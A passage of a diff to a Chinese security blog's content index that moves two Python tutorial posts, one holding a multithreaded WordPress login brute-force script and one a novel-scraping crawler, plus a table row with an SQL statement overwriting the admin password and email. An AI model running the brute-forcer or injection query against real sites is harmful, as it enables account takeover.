+<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#49;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#49;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a>](mailto:<a href="mailto:&#49;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;">&#49;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;</a>)’ WHERE uname=’admin’; “);</td>
 <td align="left">修改admin密码邮箱</td>
 </tr>
 <tr>
@@ -4844,6 +4844,60 @@
       </tags>
   </entry>
   <entry>
+    <title>Python之爆破脚本</title>
+    <url>/article/Python%E4%B9%8B%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>利用爆破功能脚本，熟悉参数、进度条模块的使用。</p>
+<h1 id="二、模块介绍"><a href="#二、模块介绍" class="headerlink" title="二、模块介绍"></a>二、模块介绍</h1><p><strong>参数模块</strong></p>
+<p>getopt函数</p>
+<pre class="highlight"><span class="line">import sys, getopt</span><br><span class="line"></span><br><span class="line">def main(argv):</span><br><span class="line">   inputfile = &#x27;&#x27;</span><br><span class="line">   outputfile = &#x27;&#x27;</span><br><span class="line">   try:</span><br><span class="line">      opts, args = getopt.getopt(argv,&quot;hi:o:&quot;,[&quot;ifile=&quot;,&quot;ofile=&quot;])</span><br><span class="line">   except getopt.GetoptError:</span><br><span class="line">      print (&#x27;test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;)</span><br><span class="line">      sys.exit(2)</span><br><span class="line">   for opt, arg in opts:</span><br><span class="line">      if opt == &#x27;-h&#x27;:</span><br><span class="line">         print (&#x27;test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;)</span><br><span class="line">         sys.exit()</span><br><span class="line">      elif opt in (&quot;-i&quot;, &quot;--ifile&quot;):</span><br><span class="line">         inputfile = arg</span><br><span class="line">      elif opt in (&quot;-o&quot;, &quot;--ofile&quot;):</span><br><span class="line">         outputfile = arg</span><br><span class="line">   print (&#x27;输入的文件为：&#x27;, inputfile)</span><br><span class="line">   print (&#x27;输出的文件为：&#x27;, outputfile)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">   main(sys.argv[1:])</span><br><span class="line"></span><br></pre>
+
+<p>说明：</p>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>argv[1:]</td>
+<td>不限制参数数量（&gt;1）</td>
+</tr>
+<tr>
+<td>try:  <br>&#9;pass  <br>except  getopt.GetoptError:  <br>&#9;pass</td>
+<td>异常捕捉，参数不存在时报错，提示正确的用法</td>
+</tr>
+<tr>
+<td>opts,args=getopt.getopt(argv,”hi:o”,[“ifile=”,”ofile=”])</td>
+<td>定义短标签（-）和长标签（–）  <br>短标签:表示必须有此参数，长标签=同理  <br><br>注意！经实验得知，<code>:、=</code>号使用时，只要会被用到传参的参数，都必须要加，否则会接收不到变量值。而不是说明文档中让人产生歧义的说法，让人误以为是可有可无的参数都不用加<code>:、=</code></td>
+</tr>
+<tr>
+<td>for opt, arg in opts:     <br>&#9;if opt == ‘-h’:       <br>&#9;&#9;print (<code>&#39;test.py -i &lt;inputfile&gt;  -o &lt;outputfile&gt;&#39;</code>)       <br>&#9;&#9;sys.exit()     <br>&#9;elif opt in (“-i”,  “–ifile”):       <br>&#9;&#9;inputfile = arg</td>
+<td>for循环判断匹配参数  ，opt为参数，arg为参数值</td>
+</tr>
+</tbody></table>
+<p><strong>进度条模块</strong></p>
+<p>rich</p>
+<pre class="highlight"><span class="line">from rich.progress import Progress		# 模块导入</span><br><span class="line"></span><br><span class="line">with Progress() as progress:			# 模块初始化，需要嵌套在主进程函数之外，total标表示总任务数</span><br><span class="line">        task = progress.add_task(&#x27;[green]Downloading...&#x27;, total=1000)   </span><br><span class="line"> </span><br><span class="line">while not progress.finished:			# 任务函数用使用，更新进度条，advance每次更新的长度</span><br><span class="line">        progress.update(task, advance=5)</span><br><span class="line"></span><br></pre>
+
+
+
+<p>三、代码</p>
+<pre class="highlight"><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">    描述：爆破脚本，用户名+密码排列组合方式，推荐精简名字典</span><br><span class="line">        支持参数、进度条、Ctrl C功能</span><br><span class="line">    version：2.0</span><br><span class="line">    author：chen</span><br><span class="line">    date：2021-08-13</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line">import getopt</span><br><span class="line">import queue</span><br><span class="line">from rich.progress import Progress</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 参数处理</span><br><span class="line">def para(argv):</span><br><span class="line">    global dicts</span><br><span class="line">    dicts = &#123;&#x27;url&#x27;: &#x27;&#x27;, &#x27;thread&#x27;: &#x27;&#x27;, &#x27;delay&#x27;: &#x27;&#x27;, &#x27;file_name&#x27;: &#x27;&#x27;, &#x27;file_pass&#x27;: &#x27;&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        opts, args = getopt.getopt(argv, &quot;u:hT:&quot;, [&quot;url=&quot;, &quot;fname=&quot;, &quot;fpass=&quot;, &quot;delay=&quot;])</span><br><span class="line">    except getopt.GetoptError:</span><br><span class="line">        print(&quot;python brute2.0.py -u http:test.com --fname C:\\Users\\Chen\\Desktop\\Temp\\user.txt --fpass C:\\Users\\Chen\\Desktop\\Temp\\pass.txt -T 100&quot;)</span><br><span class="line"></span><br><span class="line">    for opt, arg in opts:</span><br><span class="line">        if opt == &#x27;-h&#x27;:</span><br><span class="line">            print(&quot;python brute2.0.py -u http:test.com --fname C:\\Users\\Chen\\Desktop\\Temp\\user.txt --fpass C:\\Users\\Chen\\Desktop\\Temp\\pass.txt -T 100&quot;)</span><br><span class="line">            exit()</span><br><span class="line">        elif opt in (&quot;-u&quot;, &quot;--url&quot;):</span><br><span class="line">            dicts[&#x27;url&#x27;] = arg</span><br><span class="line">            # print(&#x27;url:&#x27;, dicts[&#x27;url&#x27;])</span><br><span class="line">        elif opt == &#x27;-T&#x27;:</span><br><span class="line">            dicts[&#x27;thread&#x27;] = arg</span><br><span class="line">            # print(&#x27;线程:&#x27;, dicts[&#x27;thread&#x27;])</span><br><span class="line">        elif opt == &#x27;--delay&#x27;:</span><br><span class="line">            dicts[&#x27;delay&#x27;] = arg</span><br><span class="line">            # print(&#x27;发包延时:%sms&#x27; % dicts[&#x27;delay&#x27;])</span><br><span class="line">        elif opt == &#x27;--fname&#x27;:</span><br><span class="line">            dicts[&#x27;file_name&#x27;] = arg</span><br><span class="line">            # print(&#x27;用户名字典:&#x27;, dicts[&#x27;file_name&#x27;])</span><br><span class="line">        elif opt == &#x27;--fpass&#x27;:</span><br><span class="line">            dicts[&#x27;file_pass&#x27;] = arg</span><br><span class="line">            # print(&#x27;密码字典:&#x27;, dicts[&#x27;file_pass&#x27;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 初始化字典队列</span><br><span class="line">def init(fname, fpass, q):</span><br><span class="line">    # 排列组合模式生成字典队列，两个都过大时会导致初始化很慢。</span><br><span class="line">    # 建议精简用户名字典，合适的密码字典</span><br><span class="line">    print(&#x27;正在初始化字典队列...&#x27;)</span><br><span class="line">    for i in open(fname):</span><br><span class="line">        for j in open(fpass):</span><br><span class="line">            # 以列表形式写入队列</span><br><span class="line">            q.put([i.strip(), j.strip()])</span><br><span class="line">    print(&#x27;字典队列初始化完毕！&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run(q, BarId, url):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        que = q.get()</span><br><span class="line"></span><br><span class="line">        # 爆破目标的核心数据包，根据实际情况更改</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;log&quot;: que[0],</span><br><span class="line">            &quot;pwd&quot;: que[1],</span><br><span class="line">            &quot;wp-submit&quot;: &quot;%E7%99%BB%E5%BD%95&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        # 代理，自定义</span><br><span class="line">        proxy = &#123;</span><br><span class="line">            &#x27;http&#x27;: &#x27;http://127.0.0.1:7890&#x27;,</span><br><span class="line">            &#x27;https&#x27;: &#x27;https://127.0.0.1:7890&#x27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # 发包，禁止302跳转，否则抓不到302返回状态码</span><br><span class="line">        # 可取消代理</span><br><span class="line">        rep = requests.post(url=url, data=data, allow_redirects=False)</span><br><span class="line">        if rep.status_code == 302:</span><br><span class="line">            print(&#x27;\033[32m爆破成功! &#123;0&#125;:&#123;1&#125;\033[0m&#x27; .format(que[0], que[1]))</span><br><span class="line">            # 爆破成功进度条拉满，触发主进程守护，结束进程</span><br><span class="line">            progress.update(BarId, advance=999999999)</span><br><span class="line">        # 更新进度条</span><br><span class="line">        progress.update(BarId, advance=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    dicts = &#123;&#125;</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    # 初始化参数</span><br><span class="line">    para(sys.argv[1:])</span><br><span class="line">    # 初始化队列</span><br><span class="line">    url = dicts[&#x27;url&#x27;]</span><br><span class="line">    delay = dicts[&#x27;delay&#x27;]</span><br><span class="line">    init(dicts[&#x27;file_name&#x27;], dicts[&#x27;file_pass&#x27;], q)</span><br><span class="line"></span><br><span class="line">    # 进度条初始化</span><br><span class="line">    with Progress() as progress:</span><br><span class="line">        BarId = progress.add_task(&#x27;[green]Status:&#x27;, total=q.qsize())</span><br><span class="line">        # 多线程数量</span><br><span class="line">        for i in range(int(dicts[&#x27;thread&#x27;])):</span><br><span class="line">            # 设置主线程守护</span><br><span class="line">            t = threading.Thread(target=run, args=[q, BarId, url, delay], daemon=True)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">        # 进度条结束，终止主程序运行</span><br><span class="line">        # 解决Ctrl+C终止程序 和 程序自动结束的问题</span><br><span class="line">        while not progress.finished:</span><br><span class="line">            pass</span><br><span class="line"></span><br></pre>
+
+
+
+<p>4、下载</p>
+<p><a href="https://www.zerochen.top/download/Burst/Burst2.0.py">https://www.zerochen.top/download/Burst/Burst2.0.py</a></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>爆破</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python之端口扫描</title>
     <url>/article/Python%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
     <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>借用端口扫描脚本，记录socket模块和threading模块知识点，以供日后查询。</p>
@@ -4870,6 +4924,29 @@
       </categories>
       <tags>
         <tag>端口扫描</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python之网络爬虫</title>
+    <url>/article/Python%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。</p>
+<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p>介绍：发送简单请求，获取响应</p>
+<p>使用：</p>
+<pre class="highlight"><span class="line">import requests				# 导包</span><br><span class="line">res = requests.get(url)		# 发送get请求包（可换成.post）</span><br><span class="line">res.text					# 获取返回包内容</span><br><span class="line">res.request					# 获取请求包内容</span><br><span class="line">res.encoding  				# 获取页面编码格式</span><br><span class="line">res.content			  		# http响应内容的二进制形式</span><br><span class="line">res.status_code				# http响应码，200响应成功，404失败</span><br></pre>
+
+<h2 id="BeautifulSoup模块"><a href="#BeautifulSoup模块" class="headerlink" title="BeautifulSoup模块"></a>BeautifulSoup模块</h2><p>介绍：用于解析html/xml。</p>
+<p>使用</p>
+<pre class="highlight"><span class="line">from bs4 import BeautifulSoup				# 导包</span><br><span class="line">soup = BeautifulSoup(&#x27;html&#x27;, &#x27;lxml&#x27;)		# 获取html属性</span><br><span class="line">soup.title									# 获取其中title内容,包括标签</span><br><span class="line">soup.title.string							# 仅获取title</span><br><span class="line">soup.select									# 指定某个元素下某个标签</span><br><span class="line">	soup.select(&#x27;.book-mulu &gt; ul &gt; li &gt; a&#x27;)</span><br><span class="line">	同</span><br><span class="line">	soup.find(&#x27;div&#x27;,class_=&#x27;chapter_content&#x27;)</span><br><span class="line">soup.text									# 获取标签内容</span><br><span class="line">find_all									# 查找所有符合条件的元素</span><br><span class="line">find										# 匹配第一个元素</span><br></pre>
+
+<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用网络爬虫脚本，梳理bs4、requests的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># 自定义请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def page_link(url):</span><br><span class="line">    con = &#x27;&#x27;</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)</span><br><span class="line">    # 获取当前页面编码格式</span><br><span class="line">    code = reponse.encoding</span><br><span class="line">    # 对响应包的内容解码</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)</span><br><span class="line">    # 使用bs获取指定标签内容（需绑定解析器lxml）</span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;).select(&#x27;.onearcxsbd &gt; p&#x27;)</span><br><span class="line">    for i in soup:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        con = con + i.text</span><br><span class="line">    return con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;https://www.xyyuedu.com/gdmz/sidamingzhu/sgyy/&#x27;      # 目标地址</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)            # 获取请求</span><br><span class="line">    # print(reponse.text)</span><br><span class="line">    code = reponse.encoding                                     # 获取编码方式</span><br><span class="line">    # code = reponse.apparent_encoding</span><br><span class="line">    # print(code)</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)         # 先以网页原编码方式编码，在以指定格式解码，注意，数据仅以编码方式存储，但未进行编码</span><br><span class="line">    # print(page_text)</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;)                     # 创建soup对象并指定解析器</span><br><span class="line">    aAttr = soup.select(&#x27;.zhangjie2 &gt; li &gt; a&#x27;)                  # 获得url所在的标签信息</span><br><span class="line">    # print(aAttr)</span><br><span class="line"></span><br><span class="line">    for i in aAttr:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        title = i.text</span><br><span class="line">        link = &#x27;https://www.xyyuedu.com&#x27; + i[&#x27;href&#x27;]        # 获取章节连接</span><br><span class="line">        content = page_link(link)</span><br><span class="line">        print(&#x27;开始下载 \n&#x27; + title)</span><br><span class="line">        # print(title)</span><br><span class="line">        # print(link)</span><br><span class="line">        # print(content)</span><br><span class="line">        with open(&#x27;./三国演义.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">            fp.write(title + &#x27;\n&#x27; + content + &#x27;\n\n\n&#x27;)</span><br><span class="line">            print(title + &#x27;\n&#x27; + &#x27;下载结束&#x27; + &#x27;\n&#x27;)</span><br></pre>
+
+<h1 id="4、下载"><a href="#4、下载" class="headerlink" title="4、下载"></a>4、下载</h1><p><a href="https://www.zerochen.top/download/Scan/pc_sg.py">https://www.zerochen.top/download/Scan/pc_sg.py</a></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>爬虫</tag>
       </tags>
   </entry>
   <entry>
@@ -4983,105 +5060,6 @@
       </categories>
       <tags>
         <tag>Redis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python之爆破脚本</title>
-    <url>/article/Python%E4%B9%8B%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>利用爆破功能脚本，熟悉参数、进度条模块的使用。</p>
-<h1 id="二、模块介绍"><a href="#二、模块介绍" class="headerlink" title="二、模块介绍"></a>二、模块介绍</h1><p><strong>参数模块</strong></p>
-<p>getopt函数</p>
-<pre class="highlight"><span class="line">import sys, getopt</span><br><span class="line"></span><br><span class="line">def main(argv):</span><br><span class="line">   inputfile = &#x27;&#x27;</span><br><span class="line">   outputfile = &#x27;&#x27;</span><br><span class="line">   try:</span><br><span class="line">      opts, args = getopt.getopt(argv,&quot;hi:o:&quot;,[&quot;ifile=&quot;,&quot;ofile=&quot;])</span><br><span class="line">   except getopt.GetoptError:</span><br><span class="line">      print (&#x27;test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;)</span><br><span class="line">      sys.exit(2)</span><br><span class="line">   for opt, arg in opts:</span><br><span class="line">      if opt == &#x27;-h&#x27;:</span><br><span class="line">         print (&#x27;test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;)</span><br><span class="line">         sys.exit()</span><br><span class="line">      elif opt in (&quot;-i&quot;, &quot;--ifile&quot;):</span><br><span class="line">         inputfile = arg</span><br><span class="line">      elif opt in (&quot;-o&quot;, &quot;--ofile&quot;):</span><br><span class="line">         outputfile = arg</span><br><span class="line">   print (&#x27;输入的文件为：&#x27;, inputfile)</span><br><span class="line">   print (&#x27;输出的文件为：&#x27;, outputfile)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">   main(sys.argv[1:])</span><br><span class="line"></span><br></pre>
-
-<p>说明：</p>
-<table>
-<thead>
-<tr>
-<th>语句</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>argv[1:]</td>
-<td>不限制参数数量（&gt;1）</td>
-</tr>
-<tr>
-<td>try:  <br>&#9;pass  <br>except  getopt.GetoptError:  <br>&#9;pass</td>
-<td>异常捕捉，参数不存在时报错，提示正确的用法</td>
-</tr>
-<tr>
-<td>opts,args=getopt.getopt(argv,”hi:o”,[“ifile=”,”ofile=”])</td>
-<td>定义短标签（-）和长标签（–）  <br>短标签:表示必须有此参数，长标签=同理  <br><br>注意！经实验得知，<code>:、=</code>号使用时，只要会被用到传参的参数，都必须要加，否则会接收不到变量值。而不是说明文档中让人产生歧义的说法，让人误以为是可有可无的参数都不用加<code>:、=</code></td>
-</tr>
-<tr>
-<td>for opt, arg in opts:     <br>&#9;if opt == ‘-h’:       <br>&#9;&#9;print (<code>&#39;test.py -i &lt;inputfile&gt;  -o &lt;outputfile&gt;&#39;</code>)       <br>&#9;&#9;sys.exit()     <br>&#9;elif opt in (“-i”,  “–ifile”):       <br>&#9;&#9;inputfile = arg</td>
-<td>for循环判断匹配参数  ，opt为参数，arg为参数值</td>
-</tr>
-</tbody></table>
-<p><strong>进度条模块</strong></p>
-<p>rich</p>
-<pre class="highlight"><span class="line">from rich.progress import Progress		# 模块导入</span><br><span class="line"></span><br><span class="line">with Progress() as progress:			# 模块初始化，需要嵌套在主进程函数之外，total标表示总任务数</span><br><span class="line">        task = progress.add_task(&#x27;[green]Downloading...&#x27;, total=1000)   </span><br><span class="line"> </span><br><span class="line">while not progress.finished:			# 任务函数用使用，更新进度条，advance每次更新的长度</span><br><span class="line">        progress.update(task, advance=5)</span><br><span class="line"></span><br></pre>
-
-
-
-<p>三、代码</p>
-<pre class="highlight"><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">    描述：爆破脚本，用户名+密码排列组合方式，推荐精简名字典</span><br><span class="line">        支持参数、进度条、Ctrl C功能</span><br><span class="line">    version：2.0</span><br><span class="line">    author：chen</span><br><span class="line">    date：2021-08-13</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line">import getopt</span><br><span class="line">import queue</span><br><span class="line">from rich.progress import Progress</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 参数处理</span><br><span class="line">def para(argv):</span><br><span class="line">    global dicts</span><br><span class="line">    dicts = &#123;&#x27;url&#x27;: &#x27;&#x27;, &#x27;thread&#x27;: &#x27;&#x27;, &#x27;delay&#x27;: &#x27;&#x27;, &#x27;file_name&#x27;: &#x27;&#x27;, &#x27;file_pass&#x27;: &#x27;&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        opts, args = getopt.getopt(argv, &quot;u:hT:&quot;, [&quot;url=&quot;, &quot;fname=&quot;, &quot;fpass=&quot;, &quot;delay=&quot;])</span><br><span class="line">    except getopt.GetoptError:</span><br><span class="line">        print(&quot;python brute2.0.py -u http:test.com --fname C:\\Users\\Chen\\Desktop\\Temp\\user.txt --fpass C:\\Users\\Chen\\Desktop\\Temp\\pass.txt -T 100&quot;)</span><br><span class="line"></span><br><span class="line">    for opt, arg in opts:</span><br><span class="line">        if opt == &#x27;-h&#x27;:</span><br><span class="line">            print(&quot;python brute2.0.py -u http:test.com --fname C:\\Users\\Chen\\Desktop\\Temp\\user.txt --fpass C:\\Users\\Chen\\Desktop\\Temp\\pass.txt -T 100&quot;)</span><br><span class="line">            exit()</span><br><span class="line">        elif opt in (&quot;-u&quot;, &quot;--url&quot;):</span><br><span class="line">            dicts[&#x27;url&#x27;] = arg</span><br><span class="line">            # print(&#x27;url:&#x27;, dicts[&#x27;url&#x27;])</span><br><span class="line">        elif opt == &#x27;-T&#x27;:</span><br><span class="line">            dicts[&#x27;thread&#x27;] = arg</span><br><span class="line">            # print(&#x27;线程:&#x27;, dicts[&#x27;thread&#x27;])</span><br><span class="line">        elif opt == &#x27;--delay&#x27;:</span><br><span class="line">            dicts[&#x27;delay&#x27;] = arg</span><br><span class="line">            # print(&#x27;发包延时:%sms&#x27; % dicts[&#x27;delay&#x27;])</span><br><span class="line">        elif opt == &#x27;--fname&#x27;:</span><br><span class="line">            dicts[&#x27;file_name&#x27;] = arg</span><br><span class="line">            # print(&#x27;用户名字典:&#x27;, dicts[&#x27;file_name&#x27;])</span><br><span class="line">        elif opt == &#x27;--fpass&#x27;:</span><br><span class="line">            dicts[&#x27;file_pass&#x27;] = arg</span><br><span class="line">            # print(&#x27;密码字典:&#x27;, dicts[&#x27;file_pass&#x27;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 初始化字典队列</span><br><span class="line">def init(fname, fpass, q):</span><br><span class="line">    # 排列组合模式生成字典队列，两个都过大时会导致初始化很慢。</span><br><span class="line">    # 建议精简用户名字典，合适的密码字典</span><br><span class="line">    print(&#x27;正在初始化字典队列...&#x27;)</span><br><span class="line">    for i in open(fname):</span><br><span class="line">        for j in open(fpass):</span><br><span class="line">            # 以列表形式写入队列</span><br><span class="line">            q.put([i.strip(), j.strip()])</span><br><span class="line">    print(&#x27;字典队列初始化完毕！&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run(q, BarId, url):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        que = q.get()</span><br><span class="line"></span><br><span class="line">        # 爆破目标的核心数据包，根据实际情况更改</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;log&quot;: que[0],</span><br><span class="line">            &quot;pwd&quot;: que[1],</span><br><span class="line">            &quot;wp-submit&quot;: &quot;%E7%99%BB%E5%BD%95&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        # 代理，自定义</span><br><span class="line">        proxy = &#123;</span><br><span class="line">            &#x27;http&#x27;: &#x27;http://127.0.0.1:7890&#x27;,</span><br><span class="line">            &#x27;https&#x27;: &#x27;https://127.0.0.1:7890&#x27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # 发包，禁止302跳转，否则抓不到302返回状态码</span><br><span class="line">        # 可取消代理</span><br><span class="line">        rep = requests.post(url=url, data=data, allow_redirects=False)</span><br><span class="line">        if rep.status_code == 302:</span><br><span class="line">            print(&#x27;\033[32m爆破成功! &#123;0&#125;:&#123;1&#125;\033[0m&#x27; .format(que[0], que[1]))</span><br><span class="line">            # 爆破成功进度条拉满，触发主进程守护，结束进程</span><br><span class="line">            progress.update(BarId, advance=999999999)</span><br><span class="line">        # 更新进度条</span><br><span class="line">        progress.update(BarId, advance=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    dicts = &#123;&#125;</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    # 初始化参数</span><br><span class="line">    para(sys.argv[1:])</span><br><span class="line">    # 初始化队列</span><br><span class="line">    url = dicts[&#x27;url&#x27;]</span><br><span class="line">    delay = dicts[&#x27;delay&#x27;]</span><br><span class="line">    init(dicts[&#x27;file_name&#x27;], dicts[&#x27;file_pass&#x27;], q)</span><br><span class="line"></span><br><span class="line">    # 进度条初始化</span><br><span class="line">    with Progress() as progress:</span><br><span class="line">        BarId = progress.add_task(&#x27;[green]Status:&#x27;, total=q.qsize())</span><br><span class="line">        # 多线程数量</span><br><span class="line">        for i in range(int(dicts[&#x27;thread&#x27;])):</span><br><span class="line">            # 设置主线程守护</span><br><span class="line">            t = threading.Thread(target=run, args=[q, BarId, url, delay], daemon=True)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">        # 进度条结束，终止主程序运行</span><br><span class="line">        # 解决Ctrl+C终止程序 和 程序自动结束的问题</span><br><span class="line">        while not progress.finished:</span><br><span class="line">            pass</span><br><span class="line"></span><br></pre>
-
-
-
-<p>4、下载</p>
-<p><a href="https://www.zerochen.top/download/Burst/Burst2.0.py">https://www.zerochen.top/download/Burst/Burst2.0.py</a></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>爆破</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python之网络爬虫</title>
-    <url>/article/Python%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。</p>
-<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p>介绍：发送简单请求，获取响应</p>
-<p>使用：</p>
-<pre class="highlight"><span class="line">import requests				# 导包</span><br><span class="line">res = requests.get(url)		# 发送get请求包（可换成.post）</span><br><span class="line">res.text					# 获取返回包内容</span><br><span class="line">res.request					# 获取请求包内容</span><br><span class="line">res.encoding  				# 获取页面编码格式</span><br><span class="line">res.content			  		# http响应内容的二进制形式</span><br><span class="line">res.status_code				# http响应码，200响应成功，404失败</span><br></pre>
-
-<h2 id="BeautifulSoup模块"><a href="#BeautifulSoup模块" class="headerlink" title="BeautifulSoup模块"></a>BeautifulSoup模块</h2><p>介绍：用于解析html/xml。</p>
-<p>使用</p>
-<pre class="highlight"><span class="line">from bs4 import BeautifulSoup				# 导包</span><br><span class="line">soup = BeautifulSoup(&#x27;html&#x27;, &#x27;lxml&#x27;)		# 获取html属性</span><br><span class="line">soup.title									# 获取其中title内容,包括标签</span><br><span class="line">soup.title.string							# 仅获取title</span><br><span class="line">soup.select									# 指定某个元素下某个标签</span><br><span class="line">	soup.select(&#x27;.book-mulu &gt; ul &gt; li &gt; a&#x27;)</span><br><span class="line">	同</span><br><span class="line">	soup.find(&#x27;div&#x27;,class_=&#x27;chapter_content&#x27;)</span><br><span class="line">soup.text									# 获取标签内容</span><br><span class="line">find_all									# 查找所有符合条件的元素</span><br><span class="line">find										# 匹配第一个元素</span><br></pre>
-
-<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用网络爬虫脚本，梳理bs4、requests的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># 自定义请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def page_link(url):</span><br><span 